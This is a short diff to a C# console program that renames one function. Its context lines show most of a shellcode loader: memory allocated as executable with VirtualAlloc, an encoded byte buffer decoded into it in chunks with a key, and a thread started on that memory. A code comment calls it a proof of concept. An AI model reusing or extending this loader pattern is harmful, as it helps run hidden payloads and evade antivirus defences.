@@ -23,7 +23,7 @@ namespace ConsoleApp1 {
 		static extern IntPtr GetCurrentProcess();
 		
 		// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
-		private static int yawhol(byte[] inputz, IntPtr addr, int position, int key)
+		private static int jawohl(byte[] inputz, IntPtr addr, int position, int key)
 		{
 			int fixSize = 100;
 			byte[] slice = new byte[]{};
@@ -71,7 +71,7 @@ namespace ConsoleApp1 {
 			if(len > fixSize)
 			{
 				position += fixSize;
-				yawhol(remainder, ptr, position, key);
+				jawohl(remainder, ptr, position, key);
 			}
 			
 			return len;
@@ -86,7 +86,7 @@ namespace ConsoleApp1 {
 			
 			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
 			
-			yawhol(buf, addr, 0, key);
+			jawohl(buf, addr, 0, key);
 			
 			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
 			
